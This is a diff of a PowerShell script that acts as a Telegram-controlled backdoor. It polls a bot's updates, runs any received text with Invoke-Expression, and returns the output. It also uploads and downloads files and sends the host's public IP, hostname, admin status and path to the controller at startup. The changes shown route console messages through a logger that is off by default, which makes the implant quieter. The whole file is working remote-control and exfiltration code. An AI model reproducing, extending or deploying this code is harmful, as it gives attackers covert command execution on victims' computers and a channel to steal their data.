@@ -10,14 +10,39 @@ Add-type                -AssemblyName       System.Drawing          # Adds a Mic
 $tTOKEN                     = "@TOKEN"  # your API Token    (without the "@")
 $tID                        = "@ID"     # your Telegram ID  (without the "@")
 
+$ps_debug                   = $false
 $api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'                  -f $tTOKEN
 $api_get_messages           = 'https://api.telegram.org/bot{0}/sendMessage'                 -f $tTOKEN
 $api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='            -f $tTOKEN
 $api_download_file          = 'https://api.telegram.org/file/bot{0}/'                       -f $tTOKEN
 $api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}'    -f $tTOKEN, $tID
 $cache_file                 = '{0}\ps_cache'                                                -f $env:LOCALAPPDATA
+$log_file                   = '{0}\ps_logfile'                                              -f $env:LOCALAPPDATA
 $wait                       =  1000
 $Global:ProgressPreference  = 'SilentlyContinue'
+
+
+function saveLocalLogs ($loglevel, $string) 
+{
+    if ($ps_debug) {
+        $datetime   = Get-Date -Format ''
+        $output     = ("[" + $datetime + "] " + $string)
+
+        if ($loglevel -match "log") {
+            Write-Host -BackgroundColor Black -ForegroundColor Yellow $output
+        } elseif ($loglevel -match "err") {
+            Write-Host -BackgroundColor Black -ForegroundColor Red $output
+        }
+
+        try {
+            Add-Content -Path $log_file -Value $output -Force
+        } catch {
+            Write-Host "log" -BackgroundColor Black -ForegroundColor Red $Error[0]
+        }
+
+        Start-Sleep -Milliseconds 50
+    }
+}
 
 
 function splitOutput ($output)
@@ -26,7 +51,7 @@ function splitOutput ($output)
 # The return of the function is an array.
 {
     if ($output.Length -gt 4096) {
-        Write-Host "Separation for every 4096 characters of the input output..."
+        saveLocalLogs "log" "Separation for every 4096 characters of the input output..."
     }
 
     $output_splitted        = $output -split ""             # Split every character from the incoming output
@@ -34,13 +59,13 @@ function splitOutput ($output)
     $array_of_output_parts  = @()                           # Set an array that it will used for saving multipart strings
     $counter                = 0                             # Set a counter to 0
 
-    Write-Host "Working on it..."
+    saveLocalLogs "log" "Working on it..."
 
     foreach ($char in $output_splitted) {
         if ($counter -eq 4096) {
-            Write-Host "Creating a block..."
+            saveLocalLogs "log" "Creating a block..."
             $array_of_output_parts += $temp_part_of_output
-            Write-Host "Block created..."
+            saveLocalLogs "log" "Block created..."
             $temp_part_of_output = ""
             $counter = 0
         }
@@ -49,10 +74,10 @@ function splitOutput ($output)
         $counter += 1
     }
     
-    Write-Host "Create the last block..."
+    saveLocalLogs "log" "Create the last block..."
     $array_of_output_parts += $temp_part_of_output
     
-    Write-Host "The output is ready to be sent"
+    saveLocalLogs "log" "The output is ready to be sent"
     return $array_of_output_parts
 }
 
@@ -74,19 +99,19 @@ function downloadDocument ($file_id, $file_name)
 # The "downloadDocument" function takes as parameters the file_id and the file_name of the document uploaded to Telegram by the controller of the Bot. 
 # Send a Get request to the Telegram API to download the file.
 {
-    Write-Host "Getting the informations about this document..."
+    saveLocalLogs "log" "Getting the informations about this document..."
     $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id)
     $file_path      = $get_file_path.result.file_path
 
-    Write-Host "The file information was found, downloading it..."
+    saveLocalLogs "log" "The file information was found, downloading it..."
     Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name
     
-    Write-Host "Checking the file..."
+    saveLocalLogs "log" "Checking the file..."
     if (Test-Path -Path $file_name) {
-        Write-Host "Downloaded"
+        saveLocalLogs "log" "Downloaded"
         sendMessage "Downloaded"
     } else {
-        Write-Host "File was not downloaded"
+        saveLocalLogs "log" "File was not downloaded"
         sendMessage "File was not downloaded"
     }
 }
@@ -96,15 +121,19 @@ function sendDocument ($file)
 # The "sendDocument" function takes the path of a file as a parameter. 
 # If the incoming file is verified, use curl.exe to unsecure (for now) the file to Telegram.
 {
-    sendMessage "Sending the document..."
     if (Test-Path -Path $file) {
         try {
+            saveLocalLogs "log" "Sending the document..."
             curl.exe -F document=@"$file" $api_upload_file --insecure | Out-Null    # Temporary solution (CURL.exe)
+            saveLocalLogs "log" "Document was sent"
         }
         catch {
-            sendMessage $Error[0]
+            $err = $Error[0]
+            saveLocalLogs "err" $err
+            sendMessage $err
         }
     } else {
+        saveLocalLogs "log" "This file does not exists"
         sendMessage "This file does not exists"
     }
 }
@@ -116,7 +145,7 @@ function sendMessage ($output, $message_id)
 # The message will then be sent to a JSON object. 
 # Finally try to send the message by making an HTTPS call to the Telegram API.
 {
-    Write-Host "Preparing for sending the output..."
+    saveLocalLogs "log" "Preparing for sending the output..."
     
     $MessageToSend = New-Object psobject
     $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id'                    -Value $tID
@@ -128,11 +157,11 @@ function sendMessage ($output, $message_id)
     $MessageToSend = $MessageToSend | ConvertTo-Json # Convert the message created to a JSON format
 
     try {
-        Write-Host "Send via API the message containing the output..."
+        saveLocalLogs "log" "Send via API the message containing the output..."
         Invoke-RestMethod -Method Post -Uri $api_get_messages -Body $MessageToSend -ContentType "application/json" | Out-Null   # Send an HTTPS POST request
-        Write-Host "The message has been successfully sent"
+        saveLocalLogs "log" "The message has been successfully sent"
     } catch {
-        Write-Host -ForegroundColor RED -BackgroundColor Black $Error[0]
+        saveLocalLogs "err" $Error[0]
         Start-Sleep -Seconds 3
     }
 }
@@ -145,15 +174,13 @@ function commandListener
 # Attention! There is a timer that will be incremented to 100ms at a time to limit HTTPS requests to the Telegram API.
 {
     if (-Not(Test-Path -Path $cache_file)) {
-        Write-Host "Create a cache file..."
+        saveLocalLogs "log" "Create a cache file..."
         Add-Content -Path $cache_file -Value "0" -Force
     }
 
-    try 
-    {
-        Write-Host "Listening for commands..."
+    try {
+        saveLocalLogs "log" "Listening for commands..."
         while (Invoke-RestMethod -Method Get "api.telegram.org") {
-            Write-Host "Checking the last text message from the telegram chat..."
             $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates           # Get the JSON response about the telegram updates
             $message    = $message.result.Message[-1]                                   # Get the last JSON record
             $message_id = $message.message_id                                           # Get the message_id of the update
@@ -161,85 +188,81 @@ function commandListener
             $text       = $message.text                                                 # Get the text message (it will be the command that you want to execute)
             $document   = $message.document                                             # If there is a document value inside the JSON record save it to this variable
             
-            $recovered_data = 'Data recovered from the GET request: {0}, ID: {1}, DOCUMENT: {2}' -f $message, $user_id, $document
-            Write-Host $recovered_data
-            
-            Write-Host "Check for a new incoming command..."
+            # saveLocalLogs "log" "Check for a new incoming command..."
             if ((Get-Content -Path $cache_file)[-1] -notmatch $message_id) {
-                Write-Host "A new command has been discovered! [$text]"
+                saveLocalLogs "log" "A new command has been discovered! [$text]"
 
-                Write-Host "Saving the message_id [$message_id] to the cache file..."
+                saveLocalLogs "log" "Saving the message_id [$message_id] to the cache file..."
                 Add-Content -Path $cache_file -Value $message_id -Force
                 
-                Write-Host "Checking for the validation of the user ID..."
+                saveLocalLogs "log" "Checking for the validation of the user ID..."
                 if ($user_id -match $tID) {
-                    Write-Host "User ID has been verified [$user_id]"
+                    saveLocalLogs "log" "User ID has been verified"
                     if ($text -match "exit") {
-                        Write-Host "Connection closure..."
+                        saveLocalLogs "log" "Connection closed"
                         exit
                     }
                     
-                    Write-Host "Checking the length of the command..."
+                    saveLocalLogs "log" "Checking the length of the command..."
                     if ($text.Length -gt 0) {
                         try {
-                            Write-Host "Executing it..."
+                            saveLocalLogs "log" "Execution..."
                             $output = Invoke-Expression -Command $text
-                            Write-Host "Converting the output captured to a String..."
+                            saveLocalLogs "log" "Converting the output captured to a String..."
                             $output = $output | Out-String
                         } catch {
                             $err = $Error[0]
-                            Write-Host "ERROR DURING THE EXECUTION OF THE INSTRUCTIONS"
-                            Write-Host "Converting the error message to a String..."
+                            saveLocalLogs "err" "ERROR DURING THE EXECUTION OF THE INSTRUCTIONS"
+                            saveLocalLogs "err" $err
                             $output = $err | Out-String
                         }
                         
-                        Write-Host "Sends the captured output to the split function..."
+                        saveLocalLogs "log" "Sends the captured output to the split function..."
                         $output = splitOutput $output
                         
-                        Write-Host "Send to Telegram all blocks returned from the split function..."
+                        saveLocalLogs "log" "Send to Telegram all blocks returned from the split function..."
                         foreach ($block in $output) {
-                            Write-Host "Converting to string the splitted block..."
+                            saveLocalLogs "log" "Converting to string the splitted block..."
                             $block = $block | Out-String
 
-                            Write-Host "Checking if the block size is major than 2..."
+                            saveLocalLogs "log" "Checking if the block size is major than 2..."
                             if ($block.Length -gt 2) {
-                                Write-Host "Send the data to the message sending function..."
+                                saveLocalLogs "log" "Send the data to the message sending function..."
                                 sendMessage $block $message_id
                             } else {
-                                Write-Host "Send the data to the message sending function..."
+                                saveLocalLogs "log" "Send the data to the message sending function..."
                                 sendMessage "No Output Data" $message_id
                             }
                         }
 
-                        Write-Host "Set the timer to 1000ms"
+                        saveLocalLogs "log" "Set the timer to 1000ms"
                         $wait = 1000
                     }
                     
                     if ($document) {
-                        Write-Host "Getting the informations about the file..."
+                        saveLocalLogs "log" "Getting the informations about the file..."
                         $file_id   = $document.file_id
                         $file_name = $document.file_name
                         
-                        Write-Host "File informations: [$file_id] [$file_name]"
+                        # saveLocalLogs "log" "File informations: [$file_id] [$file_name]"
 
-                        Write-Host "Send these informations to the download file function..."
+                        saveLocalLogs "log" "Send these informations to the download file function..."
                         downloadDocument $file_id $file_name
                     }
                 } else {
                     $unauth_user_found = ("Unauthorized user found! " + $user_id)
-                    Write-Host $unauth_user_found
+                    saveLocalLogs "log" $unauth_user_found
                     sendMessage $unauth_user_found
                 }
             }
 
             if ($wait -eq 15000) {
-                Write-Host "The timer has reached the maximum of its default value, I reset it to 1000ms..."
+                saveLocalLogs "log" "The timer has reached the maximum of its default value, I reset it to 1000ms..."
                 $wait = 1000
             } else {
                 $wait = $wait + 100
             }
             
-            Write-Host "Wait [$wait]ms..."
             Start-Sleep -Milliseconds $wait
         }
     } 
@@ -250,11 +273,13 @@ function commandListener
                 break
             }
             catch {
-                Write-Host $Error[0]
-                Start-Sleep -Milliseconds 5
+                saveLocalLogs "err" $Error[0]
             }
         }
-        Write-Host "Restart the listener..."
+
+        Start-Sleep -Seconds 5
+
+        saveLocalLogs "log" "Restart the listener..."
         commandListener
     }
 }
@@ -262,19 +287,19 @@ function commandListener
 
 try {
     if ((tnc).PingSucceeded) {
-        Write-Host "Alert the Bot owner that the listener has been started!"
-        Write-Host "Recovering initial informations..."
+        saveLocalLogs "log" "Alert the Bot owner that the listener has been started!"
+        saveLocalLogs "log" "Recovering initial informations..."
         $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content                  # Get the Public IP from the ISP
         $_path  = (Get-Location).Path                                                   # Get the current location of the Bot
         $_user  = checkAdminRights                                                      # Get the boolean value to check if the user is an administrator or not
         $_host  = $env:COMPUTERNAME                                                     # Get the current Hostname or the name of the machine
         $_body  = '{0} ({1}) - IP: {2} - [{3}]' -f $_host, $_user, $_ip, $_path         # Build everything...
         sendMessage $_body                                                              # Send a message with the body 
-        Write-Host "Alert sent"
+        saveLocalLogs "log" "Alert sent"
     }
 }
 catch {
-    Write-Host $Error[0]
+    saveLocalLogs "err" $Error[0]
 }
 
 
